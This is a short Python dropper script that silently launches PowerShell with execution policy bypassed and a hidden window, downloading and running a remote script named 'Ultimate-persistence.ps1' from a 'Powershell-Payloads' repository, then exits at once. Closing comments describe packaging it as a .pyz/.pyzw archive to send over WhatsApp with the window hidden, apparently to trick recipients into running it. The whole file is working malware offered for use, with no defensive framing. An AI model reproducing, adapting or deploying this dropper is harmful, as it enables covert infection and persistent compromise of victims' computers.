import subprocess
import sys

# Command to run the PowerShell script from the URL
powershell_cmd = (
    "powershell -Command \"Start-Process powershell -ArgumentList "
    "'-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
    "IEX (IWR https://raw.githubusercontent.com/ShorterKing/Powershell-Payloads/refs/heads/main/Final%20Payload/Ultimate-persistence.ps1)' "
    "-WindowStyle Hidden\""
)

# Windows-specific creation flags to hide the console window
CREATE_NO_WINDOW = 0x08000000  # Hides the window

# Run the command without showing a console
subprocess.Popen(
    powershell_cmd,
    shell=True,
    creationflags=CREATE_NO_WINDOW,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    stdin=subprocess.PIPE
)

# Exit the Python script immediately
sys.exit(0)

#use python -m zipapp . -o myapp.pyz command to create a zip to send to whatsapp
#also add myapp.pyzw for hidden window
